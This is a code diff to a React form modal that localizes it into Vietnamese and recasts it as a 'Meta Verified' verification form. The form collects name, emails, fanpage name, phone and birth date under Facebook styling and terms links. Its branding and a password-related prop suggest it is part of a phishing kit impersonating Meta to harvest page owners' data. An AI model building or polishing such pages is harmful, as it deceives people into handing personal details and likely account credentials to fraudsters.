@@ -18,7 +18,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   const dispatch = useAppDispatch();
   const formData = useAppSelector((state) => state.stepForm.data);
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
     const { id, value } = e.target;
     dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
     setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
@@ -38,11 +38,14 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       e.preventDefault();
 
       const newErrors: Record<string, string> = {};
-      if (!formData.fullName.trim()) newErrors.fullName = "Please enter enough full name.";
-      if (!formData.email.trim()) newErrors.email = "Please enter enough email address.";
-      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Please enter enough email business address.";
-      if (!formData.fanpage.trim()) newErrors.fanpage = "Please enter enough page name.";
-      if (!formData.phone.trim()) newErrors.phone = "Please enter enough phone number.";
+      if (!formData.fullName.trim()) newErrors.fullName = "Vui lòng nhập họ và tên đầy đủ.";
+      if (!formData.email.trim()) newErrors.email = "Vui lòng nhập địa chỉ email liên hệ.";
+      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Vui lòng nhập email doanh nghiệp hợp lệ.";
+      if (!formData.fanpage.trim()) newErrors.fanpage = "Vui lòng nhập tên Trang/Fanpage.";
+      if (!formData.phone.trim()) newErrors.phone = "Vui lòng nhập số điện thoại.";
+      if (!formData.day) newErrors.day = "Vui lòng chọn ngày sinh.";
+      if (!formData.month) newErrors.month = "Vui lòng chọn tháng sinh.";
+      if (!formData.year) newErrors.year = "Vui lòng chọn năm sinh.";
 
       if (Object.keys(newErrors).length > 0) {
         setErrors(newErrors);
@@ -64,22 +67,31 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   };
 
   const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
-  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
+  const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));
 
   return (
     <Modal
       isOpen={isOpen}
-      title={"Information"}
+      title={"Thông tin xác minh"}
       onClose={handleClose}
     >
       <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
+            <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
+              <p className='text-[13px] leading-[1.55] text-[#33507f]'>
+                Vui lòng cung cấp thông tin chính xác để hoàn tất hồ sơ xác minh Meta Verified. Các trường bắt buộc cần được điền đầy đủ để tránh gián đoạn quá trình xét duyệt.
+              </p>
+            </div>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
                 id='fullName'
-                placeholder={"Full Name"}
+                placeholder={"Họ và tên người đại diện"}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fullName}
                 onChange={handleChange}
@@ -91,7 +103,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <input
                 type="text"
                 id='email'
-                placeholder={"Email Address"}
+                placeholder={"Email liên hệ"}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.email}
                 onChange={handleChange}
@@ -103,7 +115,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <input
                 type="text"
                 id='emailBusiness'
-                placeholder={"Email Business Address"}
+                placeholder={"Email doanh nghiệp"}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.emailBusiness}
                 onChange={handleChange}
@@ -115,7 +127,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <input
                 type="text"
                 id='fanpage'
-                placeholder={"Fanpage Name"}
+                placeholder={"Tên Trang/Fanpage"}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fanpage}
                 onChange={handleChange}
@@ -139,48 +151,56 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             {errorText('phone')}
 
             <div>
-              <b className='text-[#9a979e] text-[14px] mb-[7px]'>Date of Birth</b>
+              <b className='text-[#5c6982] text-[14px] mb-[7px]'>Ngày tháng năm sinh</b>
             </div>
             <div className="grid grid-cols-3 gap-[10px]">
               <div>
                 <div className={inputClass('day')}>
-                  <input
-                    type="number"
-                    placeholder={"Day"}
+                  <select
                     id='day'
                     className="w-full outline-0 h-full"
                     value={formData.day}
                     onChange={handleChange}
-                  />
+                  >
+                    <option value="">Ngày</option>
+                    {days.map((day) => (
+                      <option key={day} value={day}>{day}</option>
+                    ))}
+                  </select>
                 </div>
                 {errorText('day')}
               </div>
 
               <div>
                 <div className={inputClass('month')}>
-                  <input
-                    type="number"
-                    placeholder={"Month"}
+                  <select
+                    id='month'
                     className="w-full outline-0 h-full"
                     value={formData.month}
-                    id='month'
                     onChange={handleChange}
-                  />
+                  >
+                    <option value="">Tháng</option>
+                    {months.map((month) => (
+                      <option key={month} value={month}>{month}</option>
+                    ))}
+                  </select>
                 </div>
                 {errorText('month')}
               </div>
 
               <div>
                 <div className={inputClass('year')}>
-                  <input
-                    type="number"
-                    inputMode="numeric"
-                    placeholder={"Year"}
+                  <select
                     id='year'
                     className="w-full outline-0 h-full"
                     value={formData.year}
                     onChange={handleChange}
-                  />
+                  >
+                    <option value="">Năm</option>
+                    {years.map((year) => (
+                      <option key={year} value={year}>{year}</option>
+                    ))}
+                  </select>
                 </div>
                 {errorText('year')}
               </div>
@@ -191,23 +211,20 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <textarea
                 id='message'
                 className="w-full outline-0 h-full resize-none"
-                placeholder={"Message"}
+                placeholder={"Mô tả ngắn gọn về yêu cầu xác minh (tùy chọn)"}
                 value={formData.message}
                 onChange={handleChange}
               />
             </div>
 
-            <div>
-              <p className='text-[#9a979e] text-[14px] mb-[7px]'>Our response will be sent to you within 14 - 48 hours.</p>
-            </div>
             <div className='mt-[15px] mb-[20px]'>
               <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                 <CustomCheckbox />
-                I agree to the <a href='' className='text-[#0064E0] hover:underline'>Terms of use <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
+                Tôi đồng ý với <a href='https://www.facebook.com/legal/terms' target='_blank' rel='noopener noreferrer' className='text-[#0064E0] hover:underline'>Điều khoản sử dụng <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
               </label>
             </div>
             <div className='w-full mt-[20px] '>
-              <button className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>Submit</button>
+              <button className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>Gửi thông tin xác minh</button>
             </div>
           </div>
 
